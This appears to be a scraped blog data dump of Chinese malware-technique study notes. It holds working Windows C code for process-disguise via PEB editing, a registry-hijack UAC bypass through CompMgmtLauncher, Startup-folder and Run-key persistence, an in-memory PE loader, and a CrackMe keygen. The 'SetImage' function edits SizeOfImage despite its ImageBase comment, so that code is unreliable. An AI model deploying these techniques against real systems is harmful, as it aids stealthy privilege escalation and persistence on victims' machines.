NTSTATUS(NTAPI* typedef_NtQueryInformationProcess)( IN HANDLE ProcessHandle, IN PROCESSINFOCLASS ProcessInformationClass, OUT PVOID ProcessInformation, IN ULONG ProcessInformationLength, OUT PULONG ReturnLength OPTIONAL );/*PID：需要进行伪装的进程PID* lpwszpath：伪装路径* lpwszcmd：伪装命令行*/BOOL DisguiseProcess(DWORD PID, wchar_t* lpwszPath, wchar_t* lpwszCmd) &#123; //打开进程获取句柄 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); if (hProcess == NULL) &#123; printf(&quot;打开进程失败\\n&quot;); return FALSE; &#125; typedef_NtQueryInformationProcess NtQueryInformationProcess = NULL; PROCESS_BASIC_INFORMATION pbi = &#123; 0 &#125;; PEB peb = &#123; 0 &#125;; RTL_USER_PROCESS_PARAMETERS Param = &#123; 0 &#125;; USHORT usCmdLen = 0; USHORT usPathLen = 0; NtQueryInformationProcess = (typedef_NtQueryInformationProcess)GetProcAddress(LoadLibraryA(&quot;ntdll.dll&quot;), &quot;NtQueryInformationProcess&quot;); if (NtQueryInformationProcess == NULL) &#123; printf(&quot;获取函数地址失败\\n&quot;); return FALSE; &#125; NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &amp;pbi, sizeof(pbi), NULL); if (!NT_SUCCESS(status)) &#123; printf(&quot;获取进程信息失败\\n&quot;); return FALSE; &#125; //获取peb的地址 ReadProcessMemory(hProcess, pbi.PebBaseAddress, &amp;peb, sizeof(peb), NULL); //获取ProcessParameters地址 ReadProcessMemory(hProcess, peb.ProcessParameters, &amp;Param, sizeof(Param), NULL); usCmdLen = 2 + 2 * wcslen(lpwszCmd); //写入命令行信息 WriteProcessMemory(hProcess, Param.CommandLine.Buffer, lpwszCmd, usCmdLen, NULL); WriteProcessMemory(hProcess, &amp;Param.CommandLine.Length, &amp;usCmdLen, sizeof(usCmdLen), NULL); usPathLen = 2 + 2 * wcslen(lpwszPath); //写入路径信息 WriteProcessMemory(hProcess, Param.ImagePathName.Buffer, lpwszPath, usPathLen, NULL); WriteProcessMemory(hProcess, &amp;Param.ImagePathName.Length, &amp;usPathLen, sizeof(usPathLen), NULL); return TRUE;&#125;int main()&#123; //伪装自身获取自身PID，如果伪装其他程序可以通过窗口或者进程名方式获得PID if (DisguiseProcess(_getpid(), L&quot;C:\\\\Windows\\\\System32\\\\notepad.exe&quot;, L&quot;C:\\\\Windows\\\\Syetem32\\\\notepad.exe&quot;) == FALSE) &#123; printf(&quot;进程伪装失败\\n&quot;); system(&quot;pause&quot;); exit(-1); &#125; printf(&quot;伪装成功\\n&quot;); system(&quot;pause&quot;); return 0;&#125; 运行伪装程序，提示伪装成功 然后使用Process Explorer查看伪装程序的相关信息。可以看到进程已经伪装成功，描述这里写着记事本，路径和命令行都是我们写入的伪装信息。 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"隐藏技术","slug":"隐藏技术","permalink":"https://b1ack1e.github.io/tags/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF/"}]},{"title":"提权技术-Bypass UAC","slug":"提权技术-Bypass UAC","date":"2021-07-20T06:24:40.000Z","updated":"2021-08-09T10:52:25.166Z","comments":true,"path":"2021/07/20/提权技术-Bypass UAC/","link":"","permalink":"https://b1ack1e.github.io/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/","excerpt":"","text":"Bypass UACUAC（UserAccount Control，用户账户控制）是微软在VISTA之后的版本中引入的一种安全机制，通过UAC，应用程序和任务可以始终在非管理员账户的安全上下文中运行，除非特别授予管理员级别的系统访问权限。UAC可以阻止未经授权的应用程序自动进行安装，并防止无意地更改系统设置。 正常UAC是有一个弹窗提示，而病毒木马为了隐藏自己，就需要不通知用户的情况下“偷偷“将自己提升为管理员权限。 在Windows中，一些高权限的程序在运行时，是不需要弹出UAC的。这些白名单程序，默认就是以管理员权限运行。可以通过DLL劫持、注入或者是修改注册表执行命令的方式启动目标程序，实现Bypass UAC提权操作。 下面拿白名单程序CompMgmtLauncher来进行一下分析。 分析CompMgmtLauncher启动过程打开procmon工具来监控CompMgmtLauncher启动。可以看到，它会读取HKCU\\Software\\Classes\\mscfile\\shell\\open\\command中的值。 可以看一下，此路径中存在什么，可以看到其中没有值 如果该路径没有值，然后就会查询HKCR\\mscfile\\shell\\open\\command，查看其中的值，存储这mmc.exe进程的路径信息。 现在可以知道，当它启动时，会先查看HKCU\\Software\\Classes\\mscfile\\shell\\open\\command，那么如果在这里添加路径信息，CompMgmtLauncher就会启动它。 现在就修改注册表信息，在HKCU\\Software\\Classes\\mscfile\\shell\\open\\command添加需要提权的程序路径，再运行CompMgmtLauncher就可以完成Bypass UAC提权。 实现1234567891011121314151617181920212223#include &quot;pch.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;int main()&#123; PVOID OldValue = NULL; //关闭重定位 Wow64DisableWow64FsRedirection(&amp;OldValue); HKEY hKey = NULL; RegCreateKeyEx(HKEY_CURRENT_USER, &quot;Software\\\\Classes\\\\mscfile\\\\Shell\\\\Open\\\\Command&quot;, 0, NULL, 0, KEY_WOW64_64KEY | KEY_ALL_ACCESS, NULL, &amp;hKey, NULL); if (hKey == NULL) &#123; printf(&quot;创建键值失败\\n&quot;); return FALSE; &#125; RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)&quot;C:\\\\Users\\\\b1ackie\\\\Desktop\\\\TestApc.exe&quot;, (strlen(&quot;C:\\\\Users\\\\b1ackie\\\\Desktop\\\\TestApc.exe&quot;) + 1)); RegCloseKey(hKey); system(&quot;CompMgmtLauncher.exe&quot;); Wow64RevertWow64FsRedirection(OldValue); system(&quot;pause&quot;); return 0;&#125; 这里需要提权的程序为桌面上的TestApc.exe，运行后查看效果。运行程序可以看到，testapc.exe直接运行。 使用procmon工具查看权限可以看到权限是高 正常启动查看权限可以看到是中。 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"提权技术","slug":"提权技术","permalink":"https://b1ack1e.github.io/tags/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF/"},{"name":"UAC","slug":"UAC","permalink":"https://b1ack1e.github.io/tags/UAC/"}]},{"title":"160CrackMe-002","slug":"160CrackMe-002","date":"2021-07-20T02:17:33.000Z","updated":"2021-08-09T10:55:33.726Z","comments":true,"path":"2021/07/20/160CrackMe-002/","link":"","permalink":"https://b1ack1e.github.io/2021/07/20/160CrackMe-002/","excerpt":"","text":"初探打开程序，看到提示输入name和serial，输入后，提示错误。 分析查壳，看到程序没有加壳，是用VB语言写的。 使用OD进行分析，搜索错误提示的字符串，可以直接定位到关键的跳转 开始分析生成serial的过程，首先是获取了name的长度然后将其乘以17CFB再加上name的第一个ASCII码，最后转为十进制字符串。 1234567891011121314151600402412 . 50 push eax ; /String = 0000000A ???00402413 . 8B1A mov ebx,dword ptr ds:[edx] ; |00402415 . FF15 E4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBstr&gt;; \\__vbaLenBstr0040241B . 8BF8 mov edi,eax ; 获取输入的name长度传入edi以便运算0040241D . 8B4D E8 mov ecx,dword ptr ss:[ebp-0x18]00402420 . 69FF FB7C0100 imul edi,edi,0x17CFB ; 长度乘0x17CFB00402426 . 51 push ecx ; /String = 80020004 ???00402427 . 0F80 91020000 jo Afkayas_.004026BE ; |0040242D . FF15 F8404000 call dword ptr ds:[&lt;&amp;MSVBVM50.#516&gt;] ; \\rtcAnsiValueBstr00402433 . 0FBFD0 movsx edx,ax ; 获取输入的第一个ascii传给edx00402436 . 03FA add edi,edx ; 乘法后的结果加上第一个ascii00402438 . 0F80 80020000 jo Afkayas_.004026BE0040243E . 57 push edi ; MSVBVM50.__vbaStrCat0040243F . FF15 E0404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;] ; 计算结果转为字符串（十进制）00402445 . 8BD0 mov edx,eax00402447 . 8D4D E0 lea ecx,dword ptr ss:[ebp-0x20] 然后将计算出的结果与“AKA-”进行拼接，再获取serial进行比较。 1234567891011121300402510 &gt; \\8B45 E8 mov eax,dword ptr ss:[ebp-0x18] ; 输入的Serial00402513 . 8B4D E4 mov ecx,dword ptr ss:[ebp-0x1C] ; 计算后的结果00402516 . 8B3D 00414000 mov edi,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrC&gt;; MSVBVM50.__vbaStrCat0040251C . 50 push eax0040251D . 68 701B4000 push Afkayas_.00401B70 ; AKA-00402522 . 51 push ecx ; /String = 80020004 ???00402523 . FFD7 call edi ; \\将AKA- 与计算后的数值拼接起来00402525 . 8B1D 70414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrM&gt;; MSVBVM50.__vbaStrMove0040252B . 8BD0 mov edx,eax0040252D . 8D4D E0 lea ecx,dword ptr ss:[ebp-0x20]00402530 . FFD3 call ebx ; MSVBVM50.__vbaStrMove; &lt;&amp;MSVBVM50.__vbaStrMove&gt;00402532 . 50 push eax00402533 . FF15 28414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCmp&gt;&gt;; 比较 注册机编写根据分析的结果进行注册机编写 12345678910111213141516#include &lt;stdio.h&gt;#include &lt;windows.h&gt;int main() &#123; printf(&quot;输入name\\n&quot;); char name[20]; gets_s(name, 20); int length = strlen(name); int num = length * 0x17CFB; num += name[0]; char* s1 = &quot;AKA-&quot;; char* serial = (char*)malloc(100); sprintf(serial, &quot;%s%d&quot;,s1,num); printf(&quot;用户名是%s\\n注册码是%s\\n&quot;,name, serial); return 0;&#125; 运行输入name:b1ackie，输出serial:AKA-682815。 输入正确的name和serial后，弹出正确提示","categories":[{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/categories/CrackMe/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/tags/CrackMe/"}]},{"title":"自启动技术-快速启动目录","slug":"自启动技术-快速启动目录","date":"2021-07-19T09:11:43.000Z","updated":"2021-08-09T10:53:21.574Z","comments":true,"path":"2021/07/19/自启动技术-快速启动目录/","link":"","permalink":"https://b1ack1e.github.io/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95/","excerpt":"","text":"快速启动目录Windows带有快速启动目录，将需要自启的程序放入其中，就可以实现开机自启。 函数说明SHGetSpecialFolderPath获取指定的系统路径 123456BOOL SHGetSpecialFolderPath( HWND hwndOwner, LPSTR lpszPath, int nFolder, BOOL fCreate); hwndOwner：窗口所有者句柄 lpszPath：返回路径的缓冲区，该缓冲区带下至少为MAX_PATH nFolder：系统路径的CSIDL标识。 值 含义 CSIDL_BITBUCKET 桌面\\回收站 CSIDL_CONTROLS 我的电脑\\控制面板 CSIDL_DESKTOP 桌面 CSIDL_DRIVES 我的电脑 CSIDL_STARTUP 开始菜单\\程序\\启动 CSIDL_SYSTEM SYSTEM文件夹 CSIDL_WINDOWS WINDOWS目录 fCreate：指示文件夹不存在时是否要创建。为FALSE时则不创建，否则创建。 返回值：成功TRUE；失败FALSE。 具体实现获取系统的快速启动目录，然后将需要自启的程序放入快速启动目录中。 123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;#include &lt;shlobj.h&gt;BOOL AutoRun(char* lpszSrcFilePath, char* lpszDestFileName) &#123; char szStartUpPath[MAX_PATH] = &#123; 0 &#125;; char szDestFilePath[MAX_PATH] = &#123; 0 &#125;; //获取快速启动目录 if (SHGetSpecialFolderPathA(NULL, szStartUpPath, CSIDL_STARTUP, TRUE) == FALSE) &#123; printf(&quot;获取系统路径失败\\n&quot;); return FALSE; &#125; //将数据写入指定的缓冲区 wsprintfA(szDestFilePath, &quot;%s\\\\%s&quot;, szStartUpPath, lpszDestFileName); //将文件内容拷贝到缓冲区 if (CopyFileA(lpszSrcFilePath, szDestFilePath, FALSE) == FALSE) &#123; printf(&quot;向快速启动目录写入失败\\n&quot;); return FALSE; &#125; return TRUE;&#125;int main() &#123; if (AutoRun(&quot;C:\\\\Users\\\\b1ackie\\\\Desktop\\\\TestApc.exe&quot;, &quot;TestApc.exe&quot;) == FALSE) &#123; printf(&quot;失败\\n&quot;); system(&quot;pause&quot;); exit(-1); &#125; printf(&quot;成功\\n&quot;); system(&quot;pause&quot;); return 0;&#125; 在物理机中运行一下此程序，火绒马上提醒 在虚拟机中运行此程序，提示成功，然后到快速启动目录中查看，即可看到自启程序 使用火绒剑进行查看，可以看到在windows的快速启动目录下，有TestApc.exe程序。 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"自启动技术","slug":"自启动技术","permalink":"https://b1ack1e.github.io/tags/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"}]},{"title":"自启动技术-注册表","slug":"自启动技术-注册表","date":"2021-07-19T06:13:39.000Z","updated":"2021-08-09T10:53:24.640Z","comments":true,"path":"2021/07/19/自启动技术-注册表/","link":"","permalink":"https://b1ack1e.github.io/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/","excerpt":"","text":"注册表方式实现自启动实现开机自启动的方式有很多，其中修改注册表的方式是最为广泛的。 函数介绍RegOpenKeyEx打开一个指定的注册表键 1234567LSTATUS RegOpenKeyExA( HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult); hKey：打开注册表项的句柄。该句柄由RegCreateKeyEx或RegOpenKeyEx函数返回，或者它可以是以下预定义键之一： HKEY_CLASSES_ROOT HKEY_CURRENT_CONFIG HKEY_CURRENT_USER HKEY_LOCAL_MACHINE HKEY_USERS lpSubKey：将打开的注册表子项的名称 ulOptions：保留，必须设置为0 samDesired：对指定键希望得到的访问权限进行的访问标记。这个参数可以是下列值得组合 值 含义 KEY_CREATE_LINK 准许生成符号键 KET_CREATE_SUB_KEY 准许生成子键 KEY_ENUMERATE_SUB_KEYS 准许生成枚举子键 KEY_EXECUTE 准许进行读操作 KEY_NOTIFY 准许更换通告 KEY_QUERY_VALUE 准许查询子键 KEY_ALL_ACESS 提供完全访问，它是上面数值的组合 KEY_READ 是KEY_QUERY_VALUE,KEY_ENUMERATE_SUB_KEYS,KEY_NOTIFY的组合 KEY_SET_VALUE 准许设置子键的数值 KEY_WRITE 是KEY_SET_VALUE、KET_CREATE_SUB_KEY的组合 KEY_WOW64_32KEY 表示64位系统中的应用程序应该在32位注册表试图上运行。32位系统会忽略该标志。 KEY_WOW64_32KEY 表示64位系统的应用程序应该在64位注册表试图上运行。32位系统上忽略该标志。 phkResult：指向一个变量的指针，该变量保存打开注册表键的句柄。如果不再使用返回的句柄，则调用RegClose来关闭它。 返回值：如果成功，返回0；失败返回一个非零的错误代码。 RegSetValueEx函数在注册表项下设置指定值得数据和类型 12345678LSTATUS RegSetValueExA( HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData); hKey：指定一个已打开项的句柄，或一个标准项名。 lpValueName：指向一个字符串的指针，该字符串包含了与设置值的名称。若拥有该名称的值并不存在于指定的注册表中，则此函数会将其加入到该项。如果此值是NULL或指向空字符串，则此函数将会设置该项的默认值或未命名值得类型和数据。 Reserved：保留值，必须为0； dwType：指定将存储的数据类型，该参数可以为以下值之一。 值 含义 REG_BINARY 任何形式的二进制数据 REG_DWORD 一个32位的数字 REG_DWORD_LITTLE_ENDIAN 一个格式为“低字节在前”的32位数字 REG_DWORD_BIG_ENDIAN 一个格式为“高字节在前”的32位数字 REG_EXPAND_SZ 一个以0结尾的字符串，该字符串包含环境变量（如“%PATH”） REG_LINK 一个Unicode格式的带符号链接 REG_MULTI_SZ 一个以0结尾的字符串数组，该数组以链接两个0作为终止符 REG_ONE 未定义值类型 REG_RESOURCE_LIST 一个设备驱动器资源列表 REG_SZ 一个以0结尾的字符串 lpData：指向一个缓冲区，该缓冲区包含了为指定值名称存储的数据。 cbData：指定由lpData参数所指向的数据大小，单位是字节。 返回值：返回0表示陈成功；返回其他任何值都代表一个错误代码。 实现原理对于Windows来说，提供了专门的开机自启动注册表，每次开机时，它都会在这个注册表键下遍历键值，以获取键值中的程序路径，并创建进程启动程序。所以要想实现注册表开机自启动，只需要在这个注册表键下添加想要设置自启动的程序路径就可以了。 这里用最常见的RUN键来进行设置，该键位置是[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]和[HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 代码实现在HKEY_LOCAL_MACHINE下进行设置，这需要管理员运行权限。 123456789101112131415161718192021222324252627282930#include &quot;pch.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;BOOL Register(char* lpszFileName, char* lpszValueName) &#123; HKEY hKey; if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, &quot;SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run&quot;, 0, KEY_WRITE, &amp;hKey) != 0) &#123; printf(&quot;打开注册表失败\\n&quot;); return FALSE; &#125; if (RegSetValueEx(hKey, lpszValueName, 0, REG_SZ, (BYTE*)lpszFileName, (lstrlen(lpszFileName) + 1)) != 0) &#123; printf(&quot;设置注册表值失败\\n&quot;); RegCloseKey(hKey); return FALSE; &#125; RegCloseKey(hKey); return TRUE;&#125;int main()&#123; if (Register(&quot;C:\\\\Users\\\\b1ackie\\\\Desktop\\\\Register.exe&quot;, &quot;b1ackie&quot;) == FALSE) &#123; printf(&quot;自启动失败\\n&quot;); system(&quot;pause&quot;); exit(-1); &#125; printf(&quot;自启动成功\\n&quot;); system(&quot;pause&quot;); return 0;&#125; 打开程序，提示自启动成功，说明注册表设置成功。 用regedit命令查看注册表相关信息，可以成功看到当前的注册表信息，注意图中路径的不同，这是因为重定位的原因。 也可以使用火绒剑，如图可以看到启动项的信息，现在重启计算机，就会自动启动了。 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"自启动技术","slug":"自启动技术","permalink":"https://b1ack1e.github.io/tags/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"}]},{"title":"启动技术-内存直接加载运行","slug":"启动技术-内存直接加载运行","date":"2021-07-15T06:28:21.000Z","updated":"2021-08-09T10:52:21.474Z","comments":true,"path":"2021/07/15/启动技术-内存直接加载运行/","link":"","permalink":"https://b1ack1e.github.io/2021/07/15/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%86%85%E5%AD%98%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E8%BF%90%E8%A1%8C/","excerpt":"","text":"内存直接加载运行内存直接加载运行就是，模拟PE加载器的功能，把DLL或者exe等PE文件从内存中直接加载到病毒木马的内存中去运行，不需要通过loadlibrary等现成的API函数去操作。 实现原理构造一个PE装载器，将PE文件加载到内存中。大致过程，首先要申请一块内存，然后将PE文件按照映像对齐大小映射到内存中；根据重定位表，重定位硬编码数据；获取导入表中的函数及其地址；如果是DLL，获取导出表的相关数据（EXE一般没有导出表）；获取入口点的地址，若为EXE，直接跳到入口点即可执行，DLL文件的话还需要构造一个DLLMAIN函数，实现DLL加载。 具体实现打开文件并且获取大小 12345678910111213char* FileName = &quot;自己的文件路径&quot;;//打开文件HANDLE hFile = CreateFileA(FileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL);//获取大小DWORD dwFileSize = GetFileSize(hFile, NULL);//申请内存空间PBYTE pData = new BYTE[dwFileSize];DWORD dwRet = 0;//将文件读取到内存中ReadFile(hFile, pData, dwFileSize, &amp;dwRet, NULL);CloseHandle(hFile); 获取sizeofimage12345678910/*获取PE文件的镜像大小，获取加载到内存后的大小* lpData内存中的基址*/DWORD GetImageSize(LPVOID lpData) &#123; DWORD dwSizeOfImage = 0; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpData; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); dwSizeOfImage = pNtHeaders-&gt;OptionalHeader.SizeOfImage; return dwSizeOfImage;&#125; 根据获取的sizeofimage，在进程中开辟一个内存块，权限可读可写可执行。 12LPVOID lpBaseAddr = VirtualAlloc(NULL, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);RtlZeroMemory(lpBaseAddr, dwImageSize); 重定位数据12345678910111213141516171819202122232425262728293031323334/*获取重定位表的相关数据并且重定位数据* lpBaseAddr: 内存PE数据按SectionAlignment大小对齐映射到进程内存中的内存基址*/BOOL DoRelocationTable(LPVOID lpBaseAddr) &#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); //获取重定位表 PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((unsigned long)pDosHeader + pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress); if ((PVOID)pReloc == (PVOID)pDosHeader) &#123; return TRUE; &#125; //开始扫描重定位表 while ((pReloc-&gt;VirtualAddress + pReloc-&gt;SizeOfBlock) != 0) &#123; //重定位表的头部加上sizeof(IMAGE_BASE_RELOCATION)就是重定位数据的开始 WORD* pRelocData = (WORD*)((PBYTE)pReloc + sizeof(IMAGE_BASE_RELOCATION)); //获取需要重定位的数据的个数 int nNumberOfReloc = (pReloc-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD); for (int i = 0; i &lt; nNumberOfReloc; i++) &#123; //高位是否为3，判断是否需要修复 if ((DWORD)(pRelocData[i] &amp; 0x0000F000) == 0x00003000) &#123; //获取需要重定位数据的地址 DWORD* pAddress = (DWORD*)((PBYTE)pDosHeader + pReloc-&gt;VirtualAddress + (pRelocData[i] &amp; 0x0FFF)); //修改重定位数据，公式：地址-旧基址+新基址，地址是pAddress中的值 DWORD dwDelta = (DWORD)pDosHeader - pNtHeaders-&gt;OptionalHeader.ImageBase; *pAddress += dwDelta; &#125; &#125; //继续处理下一组重定位数据 pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc-&gt;SizeOfBlock); &#125; return TRUE;&#125; 导入表1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859/*获取导入表的相关数据* lpBaseAddr: 内存PE数据按SectionAlignment大小对齐映射到进程内存中的内存基址*/BOOL DoImportTable(LPVOID lpBaseAddr) &#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); //获取导入表地址 PIMAGE_IMPORT_DESCRIPTOR pImportTable = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)pDosHeader + pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); // 循环遍历导入表中的DLL及获取导入表中的函数地址 char* lpDllName = NULL; HMODULE hDll = NULL; PIMAGE_THUNK_DATA lpImportNameArray = NULL; PIMAGE_IMPORT_BY_NAME lpImportByName = NULL; PIMAGE_THUNK_DATA lpImportFuncAddrArray = NULL; FARPROC lpFuncAddress = NULL; DWORD i = 0; while (TRUE) &#123; if (0 == pImportTable-&gt;OriginalFirstThunk) &#123; break; &#125; // 获取导入表中DLL的名称并加载DLL lpDllName = (char*)((DWORD)pDosHeader + pImportTable-&gt;Name); hDll = GetModuleHandleA(lpDllName); if (NULL == hDll) &#123; hDll = LoadLibraryA(lpDllName); if (NULL == hDll) &#123; pImportTable++; continue; &#125; &#125; i = 0; // 获取OriginalFirstThunk以及对应的导入函数名称表首地址 lpImportNameArray = (PIMAGE_THUNK_DATA)((DWORD)pDosHeader + pImportTable-&gt;OriginalFirstThunk); // 获取FirstThunk以及对应的导入函数地址表首地址 lpImportFuncAddrArray = (PIMAGE_THUNK_DATA)((DWORD)pDosHeader + pImportTable-&gt;FirstThunk); while (TRUE) &#123; if (0 == lpImportNameArray[i].u1.AddressOfData) &#123; break; &#125; // 获取IMAGE_IMPORT_BY_NAME结构 lpImportByName = (PIMAGE_IMPORT_BY_NAME)((DWORD)pDosHeader + lpImportNameArray[i].u1.AddressOfData); // 判断导出函数是序号导出还是函数名称导出 if (0x80000000 &amp; lpImportNameArray[i].u1.Ordinal) &#123; // 序号导出 // 当IMAGE_THUNK_DATA值的最高位为1时，表示函数以序号方式输入，这时，低位被看做是一个函数序号 lpFuncAddress = GetProcAddress(hDll, (LPCSTR)(lpImportNameArray[i].u1.Ordinal &amp; 0x0000FFFF)); &#125; else &#123; // 名称导出 lpFuncAddress = GetProcAddress(hDll, (LPCSTR)lpImportByName-&gt;Name); &#125; lpImportFuncAddrArray[i].u1.Function = (DWORD)lpFuncAddress; i++; &#125; pImportTable++; &#125; return TRUE;&#125; 修改ImageBase1234567//修改ImageBaseBOOL SetImage(LPVOID lpBaseAddr) &#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); pNtHeaders-&gt;OptionalHeader.SizeOfImage = (ULONG32)lpBaseAddr; return TRUE;&#125; 获取入口点如果是EXE，这一步，获取addressOfEntryPoint之后跳到入口点即可直接执行。 123456789BOOL Entry(LPVOID lpBaseAddr) &#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); LPVOID Entry = (LPVOID)((ULONG32)pDosHeader + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint); __asm &#123; mov eax,Entry jmp eax &#125;&#125; 现在来测试一下直接运行一个EXE，测试文件为桌面上的TestProcess.exe。源代码如下： 12345#include &lt;stdio.h&gt;int main()&#123; printf(&quot;b1ackie!!!\\n&quot;); return 0;&#125; 运行程序查看效果，可以看到直接加载运行TestProcess.exe。 若是DLL文件，还需要构造一下DLLMAIN 123456789101112BOOL CallDllMain(LPVOID lpBaseAddr) &#123; typedef_DllMain DllMain = NULL; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); DllMain = (typedef_DllMain)((ULONG32)pDosHeader + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint); BOOL bRet = DllMain((HINSTANCE)lpBaseAddr,DLL_PROCESS_ATTACH,NULL); if (bRet == NULL) &#123; printf(&quot;构造入口点失败\\n&quot;); return bRet; &#125; return bRet;&#125; 导出表123456789101112131415161718192021222324252627282930313233343536/*获取导出函数及其地址* lpBaseAddr: 内存PE数据按SectionAlignment大小对齐映射到进程内存中的内存基址* lpszFuncName：导出函数名字*/LPVOID GetExFuncAddr(LPVOID lpBaseAddr,char* lpszFuncName) &#123; LPVOID lpFunc = NULL; PIMAGE_DOS_HEADER pDosHeader 